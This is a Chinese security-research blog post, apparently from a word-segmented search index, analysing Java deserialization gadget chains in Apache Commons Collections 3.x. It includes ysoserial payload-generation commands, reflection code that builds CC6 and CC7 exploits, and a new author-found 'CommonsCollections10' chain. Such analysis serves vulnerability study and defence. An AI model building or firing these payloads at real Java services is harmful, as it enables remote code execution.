\u524d\u534a\u90e8 \u5206 \u5229\u7528 \u94fe -- CommonsCollections7   CommonsCollections7 \u7528 \u4e86 Hashtable \u6765 \u4ee3\u66ff   AnnotationInvocationHandler   \uff0c \u4e0d\u540c \u540c\u4e8e \u4e0d\u540c\u4e8e \u524d\u9762 \u4e24\u79cd CommonsCollections7 \u5e76\u672a \u4f7f\u7528   TiedMapEntry   \uff0c \u800c\u662f \u7528 \u4e86 \u76f8\u540c key \u51b2\u7a81 \u7684 \u65b9\u5f0f \u8c03\u7528   equals   \u6765 \u89e6\u53d1   Lazy . get   \u51fd\u6570 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b   Hashtable   \u7684   readObject   \u51fd\u6570   \u7ee7\u7eed \u8ddf\u8fdb   reconstitutionPut   \u8be5 \u51fd\u6570 \u5c06 \u586b\u5145 table \u7684 \u5185\u5bb9 \uff0c \u5176\u4e2d \u7b2c 1236 \u884c\u4ec5 \u5f53\u6709 \u91cd\u590d \u6570\u636e \u51b2\u7a81 \u65f6 \uff0c \u624d \u4f1a \u8fdb\u5165 \u4e0b\u9762 \u7684 if \u8bed\u53e5 \uff0c \u8fd9\u91cc \u6211\u4eec \u7ee7\u7eed \u8ddf\u8fdb   equals   \u51fd\u6570   \u8fd9\u91cc \u7684   equals   \u51fd\u6570 \u53d6\u51b3 \u53d6\u51b3\u4e8e   key   \u7684 \u5bf9\u8c61 \uff0c \u5229\u7528 \u94fe\u7528 \u7684 \u662f   LazyMap   \u5bf9\u8c61 \uff0c \u5b9e\u9645 \u8c03\u7528 \u7684 \u662f \u7236\u7c7b   AbstractMapDecorator   \u7684   equals   \u51fd\u6570   \u8fd9\u91cc \u53c8 \u8c03\u7528 \u4e86 map \u7684 equals \u51fd\u6570 \uff0c \u8fd9\u91cc \u5b9e\u9645 \u8c03\u7528 \u7684 \u662f HashMap \u7684 \u7236\u7c7b   AbstractMap   \u7684   equals   \u51fd\u6570   \u5728 \u7b2c 495 \u884c \u8c03\u7528 \u4e86   m . get   \u51fd\u6570 \uff0c \u6240\u4ee5 \u540e\u9762 \u53c8 \u662f \u6211\u4eec \u719f\u6089 \u7684   LazyMap . get   \u7684 \u5957\u8def \u4e86 \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   Hashtable . readObject ( )   - >   Hashtable . reconstitutionPut   - >   LazyMap . equals   = >   AbstractMapDecorator . equals   = >   AbstractMap . equals   - >   m . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   5 .   \u5229\u7528 \u94fe \u6784\u9020   CommonsCollections6 \u548c 7 \u7684 exp \u6784\u9020 \u6bd4\u8f83 \u590d\u6742 \u6bd4\u8f83\u590d\u6742 \uff0c \u8fd9\u91cc \u5355\u72ec \u62ff\u51fa \u6765\u8bb2 \u4e00\u4e0b \u3002   CommonsCollections6   \u7ecf\u8fc7 \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 CommonsCollections6 \u9700\u8981 \u5c06 \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b \u6dfb\u52a0 \u5230 HashSet \u7684 \u503c \u4e0a \u3002   \u7b80\u5355 \u7684 \u65b9\u6cd5 \u5c31\u662f \u76f4\u63a5 add   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   \" foo \"   ) ;   HashSet   map   =   new   HashSet   (   1   ) ;   map   .   add   (   entry   ) ;   \u590d\u6742 \u4e00\u70b9 \uff0c \u5c31\u662f ysoserail \u91cc \u7684 \u5b9e\u73b0 \u65b9\u6cd5 \uff0c \u91c7\u7528 \u53cd\u5c04 \u673a\u5236 \u6765 \u5b8c\u6210   \u5176 \u601d\u8def \u4e3b\u8981 \u4e3a \uff1a   \u5b9e\u4f8b \u5316 \u4e00\u4e2a HashSet \u5b9e\u4f8b   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 HashSet \u7684 map \u7c7b \u5c5e\u6027   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 HashMap ( map \u7c7b \u5c5e\u6027 ) \u7684 table ( Node   ) \u7c7b \u5c5e\u6027   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 Node \u7684 key \u7c7b \u5c5e\u6027 \uff0c \u5e76 \u8bbe\u7f6e \u8be5 key \u7684 \u503c \u4e3a \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b   \u5177\u4f53 \u4ee3\u7801 \u5982\u4e0b   HashSet   map   =   new   HashSet   (   1   ) ;   map   .   add   (   \" foo \"   ) ;   Field   f   =   null   ;   try   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" map \"   ) ;   / / \u83b7\u53d6 HashSet \u7684 map   Field \u5bf9\u8c61   }   catch   (   NoSuchFieldException   e   )   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" backingMap \"   ) ;   }   Permit   .   setAccessible   (   f   ) ;   / /   \u8bbe\u7f6e map \u53ef \u88ab \u8bbf\u95ee \u4fee\u6539   HashMap   innimpl   =   null   ;   innimpl   =   (   HashMap   )   f   .   get   (   map   ) ;   / /   \u83b7\u53d6 map \u5b9e\u4f8b \u7684 map \u7c7b \u5c5e\u6027   Field   f2   =   null   ;   try   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" table \"   ) ;   / /   \u83b7\u53d6 HashMap \u7684   table   field   }   catch   (   NoSuchFieldException   e   )   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" elementData \"   ) ;   }   Permit   .   setAccessible   (   f2   ) ;   / /   \u8bbe\u7f6e HashMap \u7684 field   \u53ef \u88ab \u8bbf\u95ee   Object   [ ]   array   =   new   Object   [   0   ]   ;   array   =   (   Object   [ ]   )   f2   .   get   (   innimpl   ) ;   Object   node   =   array   [   0   ]   ;   / /   \u83b7\u53d6 Node < k , v > \u5b9e\u4f8b   if   (   node   = =   null   ) {   node   =   array   [   1   ]   ;   }   Field   keyField   =   null   ;   try   {   keyField   =   node   .   getClass   ( ) .   getDeclaredField   (   \" key \"   ) ;   / /   \u83b7\u53d6 Node \u7684 key   field   }   catch   (   Exception   e   ) {   keyField   =   Class   .   forName   (   \" java . util . MapEntry \"   ) .   getDeclaredField   (   \" key \"   ) ;   }   Permit   .   setAccessible   (   keyField   ) ;   / /   \u8bbe\u7f6e \u8be5 Field \u53ef \u88ab \u8bbf\u95ee \u4fee\u6539   keyField   .   set   (   node   ,   entry   ) ;   / /   \u5bf9 node \u5b9e\u4f8b \u586b\u5145 key \u7684 \u503c \u4e3a TiedMapEntry \u5b9e\u4f8b   \u7ecf\u8fc7 \u4e0a\u9762 \u7684 \u64cd\u4f5c \uff0c \u6700\u7ec8 \u7684 HashSet \u5b9e\u4f8b \u88ab \u6211\u4eec \u5d4c\u5165 \u4e86 \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b \u3002   \u8fd9\u91cc \u5728 \u8c03\u8bd5 \u7684 \u8fc7\u7a0b \u4e2d \uff0c \u53d1\u73b0 \u7528 ysoserail \u7684 Reflections \u6765 \u7b80\u5316 exp \uff0c \u51fa\u6765 \u7684 \u7ed3\u679c \u6709\u70b9 \u4e0d \u4e00\u6837 \uff0c \u8fd8 \u6ca1\u6709 \u627e\u5230 \u5177\u4f53 \u7684 \u539f\u56e0 \u3002 \u5982\u679c \u6709 \u5e08\u5085 \u9047\u5230 \u8fc7 \u8fd9\u79cd \u95ee\u9898 \uff0c \u6b22\u8fce \u4e00\u8d77 \u8ba8\u8bba \u8ba8\u8bba \uff01   CommonsCollections7   CommonsCollections \u5229\u7528 \u7684 \u662f key \u7684 hash \u51b2\u7a81 \u7684 \u65b9\u6cd5 \u6765 \u89e6\u53d1   equals   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u4f1a \u8c03\u7528   LazyMap . get   \u51fd\u6570   \u90a3\u4e48 \u6784\u9020 exp \u7684 \u5173\u952e \u5c31\u662f \u6784\u9020 \u4e00\u4e2a hash \u51b2\u7a81 \u7684 LazyMap \u4e86 \u3002   \u8fd9\u91cc \u5927\u5bb6 \u53ef\u4ee5 \u8ddf \u4e00\u4e0b String . hashCode \u51fd\u6570 \uff0c \u4ed6 \u7684 \u8ba1\u7b97 \u65b9\u6cd5 \u8ba1\u7b97\u65b9\u6cd5 \u5b58\u5728 \u4e0d\u540c \u5b57\u7b26 \u5b57\u7b26\u4e32 \u76f8\u540c hash \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \uff0c \u4f8b\u5982 \u5982\u4e0b \u4ee3\u7801   CommonsCollections7 \u7528 \u7684 \u5c31\u662f \u8fd9\u4e2a bug \u6765 \u5236\u9020 hash \u51b2\u7a81 \u3002   \u8fd9\u91cc \u9700\u8981 \u63d0 \u4e00\u70b9 \u7684 \u662f \u89e6\u53d1 LazyMap . get \u51fd\u6570   \u8981 \u8d70 \u5230 \u7b2c 151 \u884c\u7ea2 \u6846\u6846 \u4e0a \uff0c \u9996\u5148 \u9700\u8981 \u6ee1\u8db3 \u7684 \u662f   map   \u91cc \u4e0d \u5b58\u5728 \u5f53\u524d \u8fd9\u4e2a   key   \u4f46\u662f \u660e\u663e \u5728 \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u4e0d \u5b58\u5728 \u8fd9\u4e2a   key   \u540e \uff0c \u4f1a \u66f4\u65b0   map   \u7684 \u952e\u503c \uff0c \u8fd9 \u5c06 \u5bfc\u81f4 \u4e0b\u6b21 \u540c\u6837 \u7684   key   \u8fdb\u6765 \uff0c \u5c31 \u4e0d\u4f1a \u89e6\u53d1 \u540e\u7eed \u7684 payload \u4e86 \u3002 \u6211\u4eec \u5728 \u5199 exp \u7684 \u65f6\u5019 \u9700\u8981 \u6ce8\u610f \u5230 \u8fd9 \u4e00\u70b9 \u3002   \u6765\u770b \u4e00\u4e0b ysoserial \u7684 CommonsCollections7 \u662f \u600e\u4e48 \u7f16\u5199 \u7684 \uff01   Map   innerMap1   =   new   HashMap   ( ) ;   Map   innerMap2   =   new   HashMap   ( ) ;   / /   Creating   two   LazyMaps   with   colliding   hashes ,   in   order   to   force   element   comparison   during   readObject   Map   lazyMap1   =   LazyMap   .   decorate   (   innerMap1   ,   transformerChain   ) ;   lazyMap1   .   put   (   \" yy \"   ,   1   ) ;   Map   lazyMap2   =   LazyMap   .   decorate   (   innerMap2   ,   transformerChain   ) ;   lazyMap2   .   put   (   \" zZ \"   ,   1   ) ;   / /   Use   the   colliding   Maps   as   keys   in   Hashtable   Hashtable   hashtable   =   new   Hashtable   ( ) ;   hashtable   .   put   (   lazyMap1   ,   1   ) ;   hashtable   .   put   (   lazyMap2   ,   2   ) ;   Reflections   .   setFieldValue   (   transformerChain   ,   \" iTransformers \"   ,   transformers   ) ;   / /   Needed   to   ensure   hash   collision   after   previous   manipulations   lazyMap2   .   remove   (   \" yy \"   ) ;   \u5176\u4e2d \u7b2c \u4e24\u6b21 \u7684 put \u4f1a \u4f7f\u5f97 \u4f1a \u4f7f\u5f97 LazyMap2 \u4e2d \u589e\u52a0 \u4e86 yy \u8fd9\u4e2a \u952e\u503c \uff0c \u4e3a\u4e86 \u4fdd\u8bc1 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u540e \u4ecd\u7136 \u53ef\u4ee5 \u89e6\u53d1 \u540e\u7eed \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9\u91cc \u9700\u8981 \u5c06 lazyMap2 \u7684 yy \u952e\u503c remove \u6389 \u3002   6 .   \u6784\u9020 \u65b0 CommonsCollections10   \u7ecf\u8fc7 \u5bf9 \u524d\u9762 1 , 3 , 5 , 6 , 7 \u7684 \u5206\u6790 \uff0c \u6211\u4eec \u5176\u5b9e \u53ef\u4ee5 \u53d1\u73b0 \u5f88\u591a payload \u90fd \u662f \u201c \u6742\u4ea4 \u201d \u7684 \u6210\u679c \u3002 \u90a3\u4e48 \u6211\u4eec \u662f\u5426 \u80fd \u6839\u636e \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u6784\u9020 \u51fa \u4e00\u4e2a \u65b0 \u7684 CommonsCollections \u7684 payload \u5462 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u8bb2 \u4e00\u4e0b \u6211 \u627e\u5230 \u7684 \u4e00\u4e2a \u65b0 payload \u5229\u7528 \u3002   \u8fd9\u4e2a payload \u4e3a CommonsCollections6 \u548c 7 \u7684 \u7ed3\u5408 \uff0c \u540c CommonsCollections6 \u7c7b\u4f3c \uff0c \u8fd9\u91cc \u4e5f \u7528\u5230 \u4e86   TiedMapEntry   \u7684   hashCode   \u51fd\u6570   \u6211\u4eec \u5728 \u5206\u6790   Hashtable   \u7684   reconstitutionPut   \u51fd\u6570 \u65f6 \uff0c \u770b \u4e0b\u56fe   \u8be5 \u51fd\u6570 \u5728 \u7b2c 1234 \u884c\u5bf9   key   \u8c03\u7528 \u4e86 \u4e00\u6b21   hashCode   \u51fd\u6570 \uff0c \u90a3\u4e48 \u5f88 \u660e\u663e \uff0c \u5982\u679c key \u503c \u88ab \u4ee3\u66ff \u4e3a \u6784\u9020 \u597d \u7684   TiedMapEntry   \u5b9e\u4f8b \uff0c \u8fd9\u91cc \u6211\u4eec \u5c31 \u80fd \u89e6\u53d1   LazyMap . get   \u51fd\u6570 \uff0c \u540e\u7eed \u7684 \u8c03\u7528 \u94fe \u5c31 \u7c7b\u4f3c \u4e86 \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   Hashtable . readObject ( )   - >   Hashtable . reconstitutionPut   - >   key . hashCode ( )   = >   TiedMapEntry . hashCode ( )   - >   TiedMapEntry . getValue   - >   TiedMapEntry . map . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   \u5176\u5b9e \u4ece \u5229\u7528 \u94fe \u6765\u770b \uff0c \u4e0e CommonsCollections6 \u7684 \u533a\u522b \u5728\u4e8e \u524d\u90e8 \u7684 \u89e6\u53d1 \u4f7f\u7528 \u4e86 \u4e0d\u540c \u7684 \u5bf9\u8c61 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u7ed3\u5408 \u7b2c 5 \u70b9 \u7684 \u5b66\u4e60 \uff0c \u6211\u4eec \u6765 \u5199 \u4e00\u4e0b \u8fd9\u4e2a payload \u7684 \u5229\u7528 \u94fe exp   final   Transformer   transformerChain   =   new   ChainedTransformer   (   new   Transformer   [ ]   { } ) ;   final   Map   innerMap   =   new   HashMap   ( ) ;   final   Map   innerMap2   =   new   HashMap   ( ) ;   final   Map   lazyMap   =   LazyMap   .   decorate   (   innerMap   ,   transformerChain   ) ;   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   \" foo \"   ) ;   Hashtable   hashtable   =   new   Hashtable   ( ) ;   hashtable   .   put   (   \" foo \"   ,   1   ) ;   / /   \u83b7\u53d6 hashtable \u7684 table \u7c7b \u5c5e\u6027   Field   tableField   =   Hashtable   .   class   .   getDeclaredField   (   \" table \"   ) ;   Permit   .   setAccessible   (   tableField   ) ;   Object   [ ]   table   =   (   Object   [ ]   )   tableField   .   get   (   hashtable   ) ;   Object   entry1   =   table   [   0   ]   ;   if   (   entry1   = =   null   )   entry1   =   table   [   1   ]   ;   / /   \u83b7\u53d6 Hashtable . Entry \u7684 key \u5c5e\u6027   Field   keyField   =   entry1   .   getClass   ( ) .   getDeclaredField   (   \" key \"   ) ;   Permit   .   setAccessible   (   keyField   ) ;   / /   \u5c06 key \u5c5e\u6027 \u7ed9 \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 \u6784\u9020 \u597d \u7684 TiedMapEntry \u5b9e\u4f8b   keyField   .   set   (   entry1   ,   entry   ) ;   / /   \u586b\u5145 \u771f\u6b63 \u7684 \u547d\u4ee4 \u6267\u884c \u4ee3\u7801   Reflections   .   setFieldValue   (   transformerChain   ,   \" iTransformers \"   ,   transformers   ) ;   return   hashtable   ;   7 .   \u6885\u5b50 \u9152 \u5e08\u5085 \u7684 CommonsCollections9   \u627e\u5230 \u4e0a\u9762 CommonsCollections10 \u65f6 \uff0c \u5728 \u7f51\u4e0a \u627e \u4e86 \u4e00\u4e0b \u6ca1\u6709 \u6709\u6ca1\u6709 \u5e08\u5085 \u5df2\u7ecf \u6316\u5230 \u8fc7 \u4e86 \uff0c \u4e00\u5171 \u627e\u5230 \u4e0b\u9762 \u4e09\u4f4d \u5e08\u5085   https : / / github . com / Jayl1n / ysoserial / blob / master / src / main / java / ysoserial / payloads / CommonsCollections8 . java   https : / / github . com / frohoff / ysoserial / pull / 125 / commits / 4edf02ba7765488cac124c92e04c6aae40da3e5d   https : / / github . com / frohoff / ysoserial / pull / 116   \u4e00\u4e2a \u4e00\u4e2a \u6765\u8bf4   \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a   Jayl1n   \u5e08\u5085 \u505a \u7684 \u6539\u53d8 \u4e3b\u8981 \u662f \u6700\u7ec8 \u7684 Runtime . getRuntime ( ) . exec \u6539\u6210 \u4e86 URLClassLoader . loadClass ( ) . newInstance \u7684 \u65b9\u5f0f \uff0c \u524d\u9762 \u7528 \u7684 \u8fd8\u662f CommonsCollections6 \uff0c \u8fd9\u91cc \u6682\u65f6 \u4e0d \u5c06 \u5176 \u5f52\u7c7b \u4e3a \u65b0 \u7684 \u5229\u7528 \u94fe \u3002   \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u662f   \u6885\u5b50 \u9152   \u5e08\u5085 \u63d0\u4ea4 \u7684 CommonsCollections9 \uff0c \u4e3b\u8981 \u5229\u7528 \u7684 \u662f CommonsCollections : 3.2 \u7248\u672c \u65b0\u589e \u7684   DefaultedMap   \u6765 \u4ee3\u66ff   LazyMap   \uff0c \u56e0\u4e3a \u8fd9 \u4e24\u4e2a Map \u6709 \u540c\u6837 \u7684 get \u51fd\u6570 \u53ef\u4ee5 \u88ab \u5229\u7528 \uff0c \u8fd9\u91cc \u4e0d\u518d \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u3002   \u7b2c\u4e09 \u4e09\u4e2a \u7b2c\u4e09\u4e2a \u662f   navalorenzo   \u5e08\u5085 \u63d0\u4ea4 \u7684 CommonsCollections8 \uff0c \u5176 \u5229\u7528 \u94fe \u57fa\u4e8e CommonsCollections : 4.0 \u7248\u672c \uff0c \u6682\u65f6 \u4e0d \u5728 \u672c\u7bc7 \u6587\u7ae0 \u7684 \u5206\u6790 \u8303\u56f4 \u5185 \uff0c \u540e\u9762 \u4f1a \u597d\u597d \u5206\u6790 \u4e00\u4e0b \u3002   0x03   \u603b\u7ed3   \u8054\u5408 \u524d\u9762 \u4e24\u7bc7 \u6587\u7ae0   CommonsCollections1   \u3001   CommonsCollections3   \uff0c \u5728 \u52a0\u4e0a \u672c\u6587 \u7684 CommonsCollections5 \uff0c 6 \uff0c 7 \uff0c 9 \uff0c 10 \u3002   \u7531\u4e8e \u7f51\u4e0a \u5df2\u7ecf \u6709 \u7c7b\u4f3c \u7684 \u6587\u7ae0 \u505a \u4e86   \u603b\u7ed3   \uff0c \u8fd9\u91cc \u5c31 \u7b80\u5355 \u505a \u4e00\u4e0b CommonsCollections < = 3.2 . 1 \u4e0b \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u603b\u7ed3 \u3002   \u8d77\u59cb \u70b9   AnnotationInvocationHandler   \u7684   readObject   BadAttributeValueExpException   \u7684   readObject   HashSet   \u7684   readObject   Hashtable   \u7684   readObject   \u91cd\u8981 \u7684 \u627f\u63a5 \u70b9   LazyMap   \u7684   get   DefaultedMap   \u7684   get   TiedMapEntry   \u7684   getValue   Proxy   \u7684   invoke   \u7ec8\u70b9   ChainedTransformer   \u7684   transform   InvokerTransformer   \u7684   transform   ConstantTransformer   \u7684   transform   \u5404 exp \u7684 jdk \u9002\u7528 \u7248\u672c   jdk7   = >   CommonsCollection1 \u3001 3   jdk7   &   jdk8   = >   CommonsCollections5 , 6 , 7 , 9 , 10   \u5404 exp \u7684 commons - collections \u9002\u7528 \u7248\u672c   commons - collections < = 3.1   CommonsCollections1 , 3 , 5 , 6 , 7 , 10   commons - collections < = 3.2 . 1   CommonsCollections1 , 3 , 5 , 6 , 7 , 9 , 10   \u6700\u540e \u7684 \u6700\u540e \uff0c commons - collections : 3 . x \u7248\u672c \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u5c31 \u5206\u6790 \u5230 \u8fd9\u91cc \uff0c \u5176\u5b9e \u6211 \u76f8\u4fe1 \u5982\u679c \u60f3 \u7ee7\u7eed \u6316 \u53ef \u4ee3\u66ff \u7684 \u5229\u7528 \u94fe \u8fd8\u662f \u4f1a \u6709 \u7684 \uff0c \u5c31 \u50cf \u672c\u6587 \u6316\u5230 \u7684 CommonsCollections10 \uff0c \u5982\u679c \u5404\u4f4d \u5e08\u5085 \u6709 \u5174\u8da3 \u53ef\u4ee5 \u7ee7\u7eed \u6316\u4e0b \u4e0b\u53bb \u6316\u4e0b\u53bb \uff0c \u4e5f \u6b22\u8fce \u548c \u5404\u4f4d \u5e08\u5085 \u4e00\u8d77 \u4ea4\u6d41 \u3002   \u540e\u7eed \u8fd8\u4f1a \u628a commons - collections : 4 \u7248\u672c \u7684 \u5229\u7528 \u94fe \u505a \u4e00\u4e2a \u5206\u6790 \uff0c \u6b22\u8fce \u4e00\u8d77 \u4ea4\u6d41 \uff1a \uff09","title":"Java \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections5 , 6 , 7 , 9 , 10"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x00","text":"\u672c\u6587 \u7ee7\u7eed \u5206\u6790 CommonsCollections \u7684 \u76f8\u5173 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff0c \u8fd9\u6b21 \u4e3b\u8981 \u5206\u6790 CommonsCollections5 , 6 , 7 \uff0c \u4ee5\u53ca \u6211 \u627e \u7684 \u4e00\u4e2a \u65b0 \u5229\u7528 \u94fe \uff0c \u8fd9\u91cc \u6682\u4e14 \u5c06 \u5176 \u79f0\u4e3a 10 .","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x01","text":"jdk8 \uff0c commons - collections : 3.1   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections5   \" open   / System / Applications / Calculator . app \"   >   commonscollections5 . ser   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections6   \" open   / System / Applications / Calculator . app \"   >   commonscollections6 . ser   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections7   \" open   / System / Applications / Calculator . app \"   >   commonscollections7 . ser","title":"0x01   \u73af\u5883 \u51c6\u5907"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x02","text":"","title":"0x02   \u5229\u7528 \u94fe\u5206\u6790"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#1","text":"\u524d\u9762 \u63d0\u5230 \u8fc7 CommonsCollections1 \u548c 3 \u5728 \u6784\u9020 AnnotationInvocationHandler \u65f6 \u7528\u5230 \u4e86 Override . class \u3002 \u4f46\u662f \u5982\u679c \u4f60 \u5728 jdk8 \u7684 \u73af\u5883 \u4e0b\u53bb \u8f7d\u5165 \u751f\u6210 \u7684 payload \uff0c \u4f1a \u53d1\u751f   java . lang . Override   missing   element   entrySet   \u7684 \u9519\u8bef \u3002   \u8fd9\u4e2a \u9519\u8bef \u7684 \u4ea7\u751f \u539f\u56e0 \u4e3b\u8981 \u5728\u4e8e jdk8 \u66f4\u65b0 \u4e86   AnnotationInvocationHandler   \u53c2\u8003   jdk8 \u4e0d \u76f4\u63a5 \u8c03\u7528   s . defaultReadObject   \u6765 \u586b\u5145 \u5f53\u524d \u7684   AnnotaionInvocationHandler   \u5b9e\u4f8b \uff0c \u800c \u9009\u62e9 \u4e86 \u5355\u72ec \u586b\u5145 \u65b0 \u7684 \u53d8\u91cf \u3002   \u8fd9\u91cc \u6211\u4eec \u56de\u987e \u4e00\u4e0b \uff0c 1 \u548c 3 \u7684 payload \u7684 \u89e6\u53d1 \u70b9 \u662f   LazyMap . get   \u51fd\u6570 \uff0c \u800c \u89e6\u53d1 \u8fd9\u4e2a \u51fd\u6570 \u9700\u8981 \u4f7f\u5f97   memberValues   \u4e3a   LazyMap   \u5bf9\u8c61   \u663e\u7136 \uff0c jdk8 \u7684 \u64cd\u4f5c \u4f7f\u5f97   memberValues   \u5e76 \u4e0d\u662f \u6211\u4eec \u6784\u9020 \u597d \u7684   LazyMap   \u7c7b\u578b \u3002 \u5728 \u8c03\u8bd5 \u4e2d \uff0c \u53ef\u4ee5 \u770b\u5230 \u6b64\u65f6 \u7684   memberValues   \u4e3a   LinkedHashMap   \u5bf9\u8c61 \uff0c \u8be5 \u5bf9\u8c61 \u65e0\u6cd5 \u83b7\u5f97   entrySet   \u7684 \u5185\u5bb9 \uff0c \u6240\u4ee5 \u4f1a \u62a5 \u524d\u9762 \u7684 \u8fd9\u4e2a \u9519\u8bef \u3002   jdk8 \u4e0b CommonsCollections1 \u548c 3 \u65e0\u6cd5 \u6210\u529f \u5229\u7528 \u4e86 \uff0c \u4f46\u662f \u5982\u679c \u6211\u4eec \u53ef\u4ee5 \u627e\u5230 \u4e00\u4e2a \u66ff\u4ee3 AnnotationInvocationHandler \u7684 \u5229\u7528 \u65b9\u5f0f \u5462 \uff1f \u8fd9 \u5c31\u662f \u672c\u6587 \u8981 \u8bb2 \u7684 CommonsCollections5 \uff0c 6 \uff0c 7 \u6240 \u505a\u51fa \u7684 \u6539\u53d8 \u3002","title":"1 .   \u80cc\u666f \u56de\u987e"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#2-commonscollections5","text":"CommonsCollections5 \u4e0e 1 \u7684 \u533a\u522b \u5728\u4e8e AnnotationInvocationHandler \uff0c \u540e \u90e8\u5206 \u662f \u76f8\u540c \u7684 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u4e0d \u5206\u6790 \u540e \u90e8\u5206 \u3002   AnnotationInvocationHandler \u5728 \u524d\u9762 \u8d77\u5230 \u7684 \u4f5c\u7528 \u662f \u6765 \u89e6\u53d1 LazyMap . get \u51fd\u6570 \uff0c \u6240\u4ee5 \u6211\u4eec \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u8981 \u91cd\u65b0 \u627e \u4e00\u4e2a \u53ef\u4ee5 \u89e6\u53d1 \u8be5 \u51fd\u6570 \u7684 \u5bf9\u8c61 \u3002 \u8fd9\u4e2a \u5bf9\u8c61 \u6ee1\u8db3   \u7c7b \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u7c7b \u5c5e\u6027 \u6709\u4e2a \u53ef\u63a7 \u7684 Map \u5bf9\u8c61 \u6216 Object   \u8be5\u7c7b \u7684 \u7c7b \u51fd\u6570 \u4e0a \u6709 \u8c03\u7528 \u8fd9\u4e2a Map . get \u7684 \u5730\u65b9   CommonsCollections5 \u5728 \u8fd9\u91cc \u7528\u5230 \u4e86 TiedMapEntry \uff0c \u6765\u770b \u4e00\u4e0b   TiedMapEntry \u6709 \u4e00\u4e2a map \u7c7b \u5c5e\u6027 \uff0c \u4e14 \u5728 getValue \u5904 \u8c03\u7528 \u4e86 map . get \u51fd\u6570 \u3002 \u540c\u65f6 toString \u3001 hashCode \u3001 equals \u5747 \u8c03\u7528 \u4e86 getValue \u51fd\u6570 \uff0c \u8fd9\u91cc \u5173\u6ce8 toString \u51fd\u6570 \u3002   toString \u51fd\u6570 \u901a\u5e38 \u5728 \u4e0e \u5b57\u7b26 \u5b57\u7b26\u4e32 \u62fc\u63a5 \u65f6 \uff0c \u4f1a \u88ab \u81ea\u52a8 \u8c03\u7528 \u3002 \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u6211\u4eec \u9700\u8981 \u627e \u4e00\u4e2a \u5bf9\u8c61 \u6ee1\u8db3   \u7c7b \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u7c7b \u5c5e\u6027 \u6709\u4e2a Map . Entry \u5bf9\u8c61 \u6216 Object   \u8be5\u7c7b \u4f1a \u81ea\u52a8 \u8c03\u7528 \u8fd9\u4e2a \u7c7b \u5c5e\u6027 \u7684 toString \u51fd\u6570 \u6216 \u524d\u9762 \u7684 \u53e6\u5916 \u51e0\u79cd   \u8fd9\u91cc \u9009\u62e9 \u4e86   BadAttributeValueExpException   \u5bf9\u8c61 \uff0c \u4ed6 \u7684   readObject   \u51fd\u6570 \u4f1a \u81ea\u52a8 \u8c03\u7528 \u7c7b \u5c5e\u6027 \u7684   toString   \u51fd\u6570 \u3002   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u8fd9\u91cc   System . getSecurityManager   \u4e3a\u7a7a \uff0c \u6362\u53e5 \u6362\u53e5\u8bdd \u6362\u53e5\u8bdd\u8bf4 \uff0c \u5c31\u662f \u5f53\u524d \u7684 jvm \u73af\u5883 \u4e0d\u80fd 